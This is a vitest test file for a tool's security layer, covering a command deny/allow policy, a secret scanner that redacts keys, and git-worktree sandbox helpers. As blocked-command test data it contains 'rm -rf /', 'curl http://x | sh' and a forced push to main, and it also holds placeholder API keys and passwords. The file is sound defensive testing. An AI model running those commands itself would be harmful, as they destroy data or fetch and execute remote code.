import { describe, it, expect } from "vitest";
import { checkCommand, DEFAULT_DENY } from "../../../src/core/security/policy.js";
import { scanSecrets, hasSecret } from "../../../src/core/security/secrets.js";
import { prepareWorktree, removeWorktree, worktreeBranch, type GitRunner } from "../../../src/core/security/sandbox.js";

describe("security/policy", () => {
  it("blocks dangerous default-deny commands", () => {
    expect(checkCommand("rm -rf /").allowed).toBe(false);
    expect(checkCommand("curl http://x | sh").allowed).toBe(false);
    expect(checkCommand("git push origin main --force").allowed).toBe(false);
  });

  it("allows ordinary commands by default", () => {
    expect(checkCommand("npm test").allowed).toBe(true);
    expect(checkCommand("git status").allowed).toBe(true);
  });

  it("enforces an allow-list when provided", () => {
    const policy = { allow: [/^npm /, /^git /] };
    expect(checkCommand("npm run build", policy).allowed).toBe(true);
    expect(checkCommand("python evil.py", policy)).toMatchObject({ allowed: false, reason: "not in allow-list" });
  });

  it("deny wins over allow", () => {
    const policy = { allow: [/.*/], deny: [/secret-tool/] };
    expect(checkCommand("secret-tool dump", policy).allowed).toBe(false);
  });

  it("DEFAULT_DENY is non-empty", () => {
    expect(DEFAULT_DENY.length).toBeGreaterThan(0);
  });
});

describe("security/secrets", () => {
  it("flags an Anthropic key and redacts the value", () => {
    const text = "export KEY=sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUV";
    const f = scanSecrets(text);
    expect(f.some((x) => x.kind === "anthropic-key")).toBe(true);
    // never echo the full secret
    expect(JSON.stringify(f)).not.toContain("ABCDEFGHIJKLMNOPQRSTUV");
    expect(f[0].preview).toMatch(/…/);
  });

  it("flags assigned secrets and aws keys", () => {
    expect(hasSecret('password: "hunter2supersecret"')).toBe(true);
    expect(hasSecret("AKIAIOSFODNN7EXAMPLE")).toBe(true);
  });

  it("returns [] for clean text", () => {
    expect(scanSecrets("just some normal code here")).toEqual([]);
    expect(hasSecret("nothing to see")).toBe(false);
  });
});

describe("security/sandbox", () => {
  it("prepareWorktree issues git worktree add with a loom branch", () => {
    const calls: string[][] = [];
    const git: GitRunner = (args) => {
      calls.push(args);
      return "";
    };
    const wt = prepareWorktree("/repo", "t1", { git, base: "main" });
    expect(wt.branch).toBe(worktreeBranch("t1"));
    expect(wt.branch).toBe("loom/t1");
    expect(calls[0].slice(0, 4)).toEqual(["worktree", "add", "-b", "loom/t1"]);
    expect(calls[0]).toContain("main");
  });

  it("removeWorktree swallows git errors (best-effort)", () => {
    const git: GitRunner = () => {
      throw new Error("not a worktree");
    };
    expect(() => removeWorktree("/repo", "t1", { git })).not.toThrow();
  });
});
